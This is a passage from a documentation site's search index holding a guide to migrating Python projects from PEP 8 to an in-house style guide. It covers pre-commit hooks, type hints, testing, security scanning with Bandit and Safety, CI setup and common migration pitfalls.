\"--extend-ignore=E203\"]\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.11.2\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-requests]\n\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.9\n    hooks:\n      - id: bandit\n        args: [\"-c\", \"pyproject.toml\"]\n</code></pre> <p>Setup:</p> <pre><code>## Install hooks\npre-commit install\n\n## Run manually on all files\npre-commit run --all-files\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#migration-checklist","title":"Migration Checklist","text":"<p>Use this checklist to systematically migrate your Python project from PEP 8 to the Dukes Engineering Style Guide.</p>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-1-setup-and-configuration","title":"Phase 1: Setup and Configuration","text":"<ul> <li>[ ] Install required tools</li> </ul> <pre><code>pip install black isort mypy pytest pytest-cov pre-commit bandit safety\n</code></pre> <ul> <li>[ ] Create <code>pyproject.toml</code> configuration</li> <li>Add Black configuration (88 char line length)</li> <li>Add isort configuration (Black-compatible)</li> <li>Add mypy strict configuration</li> <li> <p>Add pytest configuration (80% coverage minimum)</p> </li> <li> <p>[ ] Create <code>.pre-commit-config.yaml</code></p> </li> <li>Add Black hook</li> <li>Add isort hook</li> <li>Add Flake8 hook (with 88 char limit)</li> <li>Add mypy hook</li> <li>Add Bandit security scanner</li> <li> <p>Run <code>pre-commit install</code></p> </li> <li> <p>[ ] Update <code>.gitignore</code></p> </li> </ul> <pre><code># Python\n__pycache__/\n*.py[cod]\n*$py.class\n.mypy_cache/\n.pytest_cache/\nhtmlcov/\n.coverage\n\n# Environment\n.env\n.env.local\nvenv/\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-2-code-formatting","title":"Phase 2: Code Formatting","text":"<ul> <li>[ ] Run Black on entire codebase</li> </ul> <pre><code>black .\n</code></pre> <ul> <li>Review changes (line length adjustments)</li> <li> <p>Commit formatted code</p> </li> <li> <p>[ ] Run isort on imports</p> </li> </ul> <pre><code>isort .\n</code></pre> <ul> <li>Verify import grouping</li> <li> <p>Commit organized imports</p> </li> <li> <p>[ ] Fix Flake8 issues</p> </li> </ul> <pre><code>flake8 . --max-line-length=88 --extend-ignore=E203\n</code></pre> <ul> <li>Address remaining style violations</li> <li>Commit fixes</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-3-add-type-hints","title":"Phase 3: Add Type Hints","text":"<ul> <li>[ ] Add type hints to function signatures</li> <li>Start with public APIs and exported functions</li> <li>Use <code>from typing import List, Dict, Optional, Union, Tuple</code></li> <li> <p>Work module by module</p> </li> <li> <p>[ ] Run mypy incrementally</p> </li> </ul> <pre><code>mypy src/module_name.py\n</code></pre> <ul> <li>Fix type errors as you add hints</li> <li> <p>Use <code># type: ignore</code> sparingly for complex cases</p> </li> <li> <p>[ ] Add return type annotations</p> </li> <li>Ensure all functions have <code>-&gt; ReturnType</code></li> <li>Use <code>-&gt; None</code> for functions without return</li> <li> <p>Use <code>Optional[Type]</code> for nullable returns</p> </li> <li> <p>[ ] Validate with mypy</p> </li> </ul> <pre><code>mypy src/\n</code></pre> <ul> <li>Achieve zero mypy errors</li> <li>Commit type-hinted code</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-4-enhance-documentation","title":"Phase 4: Enhance Documentation","text":"<ul> <li>[ ] Update module docstrings with metadata</li> <li>Add <code>@module</code>, <code>@description</code>, <code>@dependencies</code> tags</li> <li>Add <code>@version</code>, <code>@author</code>, <code>@status</code> tags</li> <li> <p>Document security classification if applicable</p> </li> <li> <p>[ ] Restructure function docstrings</p> </li> <li>Convert to Google/NumPy style with sections</li> <li>Add <code>Args:</code>, <code>Returns:</code>, <code>Raises:</code> sections</li> <li>Add usage examples for complex functions</li> <li> <p>Remove redundant type info (now in type hints)</p> </li> <li> <p>[ ] Document exceptions</p> </li> <li>List all exceptions in <code>Raises:</code> section</li> <li>Create custom exception classes</li> <li>Add docstrings to exception classes</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-5-add-tests","title":"Phase 5: Add Tests","text":"<ul> <li>[ ] Create test directory structure</li> </ul> <pre><code>mkdir -p tests/\n# Mirror src/ structure in tests/\n</code></pre> <ul> <li>[ ] Write unit tests</li> <li>Aim for 80%+ coverage</li> <li>Use naming: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></li> <li> <p>Follow Arrange-Act-Assert pattern</p> </li> <li> <p>[ ] Configure pytest</p> </li> <li>Add pytest configuration to <code>pyproject.toml</code></li> <li>Set up coverage reporting</li> <li> <p>Configure test discovery patterns</p> </li> <li> <p>[ ] Run tests and verify coverage</p> </li> </ul> <pre><code>pytest --cov=src --cov-report=term-missing tests/\n</code></pre> <ul> <li>Achieve 80%+ coverage target</li> <li>Add tests for uncovered code</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-6-security-enhancements","title":"Phase 6: Security Enhancements","text":"<ul> <li>[ ] Move secrets to environment variables</li> <li>Create <code>.env.example</code> template</li> <li>Update code to use <code>os.getenv()</code></li> <li>Add <code>.env</code> to <code>.gitignore</code></li> <li> <p>Document required environment variables</p> </li> <li> <p>[ ] Add input validation</p> </li> <li>Use Pydantic models for request validation</li> <li>Add custom validators for business rules</li> <li> <p>Validate all external inputs</p> </li> <li> <p>[ ] Replace SQL string concatenation</p> </li> <li>Use parameterized queries</li> <li>Use ORM query builders (SQLAlchemy)</li> <li> <p>Never use f-strings for SQL</p> </li> <li> <p>[ ] Run security scanners</p> </li> </ul> <pre><code>bandit -r src/\nsafety check\n</code></pre> <ul> <li>Fix identified vulnerabilities</li> <li>Document any accepted risks</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-7-cicd-integration","title":"Phase 7: CI/CD Integration","text":"<ul> <li>[ ] Create GitHub Actions workflow (if using GitHub)</li> </ul> <pre><code># .github/workflows/python-ci.yml\nname: Python CI\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-python@v4\n        with:\n          python-version: '3.11'\n      - run: pip install -r requirements.txt\n      - run: black --check .\n      - run: isort --check .\n      - run: flake8 .\n      - run: mypy src/\n      - run: pytest --cov=src tests/\n</code></pre> <ul> <li>[ ] Add CI/CD badges to README</li> <li>Test status badge</li> <li>Coverage badge</li> <li> <p>Code quality badge</p> </li> <li> <p>[ ] Configure branch protection</p> </li> <li>Require CI checks to pass</li> <li>Require code review</li> <li>Enforce pre-commit hooks</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#phase-8-documentation-and-training","title":"Phase 8: Documentation and Training","text":"<ul> <li>[ ] Update README with tool requirements</li> <li>List Black, mypy, pytest as requirements</li> <li>Add setup instructions</li> <li> <p>Document development workflow</p> </li> <li> <p>[ ] Create CONTRIBUTING guide</p> </li> <li>Reference Dukes Engineering Style Guide</li> <li>Explain pre-commit hook usage</li> <li> <p>Provide testing guidelines</p> </li> <li> <p>[ ] Team training</p> </li> <li>Share this migration guide with team</li> <li>Conduct style guide review session</li> <li>Set up IDE/editor configurations</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#common-migration-pitfalls","title":"Common Migration Pitfalls","text":"","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#1-type-hint-complexity-overload","title":"1. Type Hint Complexity Overload","text":"<p>Problem: Trying to add perfect type hints to complex legacy code all at once.</p> <p>Solution: Migrate incrementally, module by module. Use <code># type: ignore</code> temporarily for complex cases, then refactor.</p> <pre><code>## During migration - acceptable temporarily\nresult = complex_function()  # type: ignore\n\n## Target state after refactoring\nresult: Dict[str, List[User]] = complex_function()\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#2-over-reliance-on-any-type","title":"2. Over-Reliance on <code>Any</code> Type","text":"<p>Problem: Using <code>typing.Any</code> to satisfy mypy without actual type safety.</p> <p>Solution: Use specific types or <code>Union</code> types. Reserve <code>Any</code> for truly dynamic cases.</p> <pre><code>## Avoid - defeats purpose of type hints\ndef process(data: Any) -&gt; Any:\n    pass\n\n## Better - specific types\ndef process(data: Union[str, int, List[str]]) -&gt; Dict[str, int]:\n    pass\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#3-docstring-duplication","title":"3. Docstring Duplication","text":"<p>Problem: Repeating type information in both type hints and docstrings.</p> <p>Solution: Remove type information from docstrings when type hints are present.</p> <pre><code>## Redundant - types in both places\ndef get_user(user_id: int) -&gt; Optional[User]:\n    \"\"\"\n    Get user by ID.\n\n    Args:\n        user_id (int): The user ID\n\n    Returns:\n        Optional[User]: User object or None\n    \"\"\"\n    pass\n\n## Better - types in hints, descriptions in docstrings\ndef get_user(user_id: int) -&gt; Optional[User]:\n    \"\"\"\n    Retrieve user from database by ID.\n\n    Args:\n        user_id: Unique identifier for the user\n\n    Returns:\n        User object if found, None otherwise\n    \"\"\"\n    pass\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#4-test-naming-confusion","title":"4. Test Naming Confusion","text":"<p>Problem: Inconsistent test naming makes test intent unclear.</p> <p>Solution: Follow the pattern <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code> consistently.</p> <pre><code>## Inconsistent\ndef test_user_creation():\n    pass\n\ndef test_invalid_email():\n    pass\n\n## Consistent and clear\ndef test_should_create_user_when_valid_data_provided():\n    pass\n\ndef test_should_raise_error_when_invalid_email_provided():\n    pass\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#5-ignoring-pre-commit-hook-failures","title":"5. Ignoring Pre-commit Hook Failures","text":"<p>Problem: Committing code that fails pre-commit checks using <code>--no-verify</code>.</p> <p>Solution: Fix the issues, don't bypass the checks. Pre-commit hooks catch real problems.</p> <pre><code>## Wrong - bypassing checks\ngit commit --no-verify -m \"quick fix\"\n\n## Right - fix issues first\nblack .\nisort .\nmypy src/\npytest\ngit commit -m \"feat: add user validation\"\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#gradual-adoption-strategy","title":"Gradual Adoption Strategy","text":"<p>If immediate full migration is not feasible, adopt incrementally:</p>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#week-1-2-tooling-setup","title":"Week 1-2: Tooling Setup","text":"<ul> <li>Install Black, mypy, pytest, pre-commit</li> <li>Configure <code>pyproject.toml</code></li> <li>Run Black to reformat entire codebase</li> <li>Set up CI/CD with formatting checks</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#week-3-4-type-hints-for-new-code","title":"Week 3-4: Type Hints for New Code","text":"<ul> <li>Require type hints for all new functions</li> <li>Add type hints to recently modified modules</li> <li>Start mypy checking on new modules only</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#week-5-8-documentation-enhancement","title":"Week 5-8: Documentation Enhancement","text":"<ul> <li>Add structured metadata to module docstrings</li> <li>Improve docstrings for public APIs</li> <li>Add usage examples to key functions</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#week-9-12-testing-and-coverage","title":"Week 9-12: Testing and Coverage","text":"<ul> <li>Add pytest configuration</li> <li>Write tests for new features (require 80% coverage)</li> <li>Incrementally add tests to existing critical modules</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#month-4-complete-migration","title":"Month 4+: Complete Migration","text":"<ul> <li>Systematically add type hints to remaining modules</li> <li>Achieve 80%+ test coverage across codebase</li> <li>Enable strict mypy checking project-wide</li> <li>Full security audit with Bandit/Safety</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#success-metrics","title":"Success Metrics","text":"<p>Track these metrics to measure migration progress:</p> <ul> <li>Type Hint Coverage: % of functions with complete type hints (Target: 100%)</li> <li>mypy Pass Rate: % of modules passing strict mypy checks (Target: 100%)</li> <li>Test Coverage: % of code covered by tests (Target: 80%+)</li> <li>Security Scan: Bandit/Safety issues count (Target: 0 high/critical)</li> <li>Pre-commit Pass: % of commits passing all hooks (Target: 100%)</li> <li>Docstring Completeness: % of functions with structured docstrings (Target: 100%)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#support-and-resources","title":"Support and Resources","text":"","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#documentation-references","title":"Documentation References","text":"<ul> <li>Python Style Guide - Full Dukes Engineering Python standards</li> <li>Testing Strategies - pytest patterns and best practices</li> <li>Security Scanning Guide - Bandit, Safety integration</li> <li>GitHub Actions Guide - Python CI/CD workflows</li> <li>IDE Integration Guide - VS Code, PyCharm setup</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#tool-documentation","title":"Tool Documentation","text":"<ul> <li>Black - Code formatter</li> <li>mypy - Static type checker</li> <li>pytest - Testing framework</li> <li>Bandit - Security linter</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#community-support","title":"Community Support","text":"<ul> <li>GitHub Issues: Report migration challenges</li> <li>Team Discussions: Share migration experiences</li> <li>Office Hours: Schedule style guide review sessions</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#conclusion","title":"Conclusion","text":"<p>Migrating from PEP 8 to the Dukes Engineering Style Guide enhances your Python codebase with:</p> <p>\u2705 Type Safety - Catch errors before runtime with mypy \u2705 Consistency - Automated formatting with Black \u2705 Quality - 80%+ test coverage requirement \u2705 Security - Built-in security best practices \u2705 Documentation - Structured, AI-parseable metadata \u2705 Automation - Pre-commit hooks and CI/CD integration</p> <p>The migration builds on PEP 8's solid foundation while adding modern DevOps-oriented practices essential for infrastructure automation and production reliability.</p> <p>Questions or need help? Open an issue or consult the Getting Started Guide.</p>","tags":["migration","pep8","python","style-guide","upgrade","transition"]}]}